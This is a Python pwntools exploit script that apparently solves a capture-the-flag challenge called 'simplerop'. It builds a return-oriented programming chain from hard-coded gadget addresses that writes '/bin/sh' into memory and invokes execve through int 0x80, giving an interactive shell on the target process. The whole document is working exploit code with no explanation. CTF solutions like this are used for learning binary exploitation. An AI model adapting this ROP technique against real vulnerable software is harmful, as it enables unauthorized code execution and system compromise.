#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

data_addr = 0x080ea060
pop_edx_ecx_ebx_ret = 0x0806e850
pop_eax_ret = 0x080bae06
pop_edx_ret = 0x0806e82a
gadget = 0x0809a15d#mov dword ptr [edx], eax ; ret
int80_addr = 0x080493e1

payload = cyclic(0x1c + 0x4)
payload += flat([pop_edx_ret, data_addr, pop_eax_ret, "/bin", gadget])
payload += flat([pop_edx_ret, (data_addr + 4), pop_eax_ret, "/sh\0", gadget])
payload += flat([pop_edx_ecx_ebx_ret, 0, 0, data_addr])
payload += flat([pop_eax_ret, 11, int80_addr])

io = process("./simplerop")
io.sendlineafter(" :", payload)

io.interactive()
io.close()
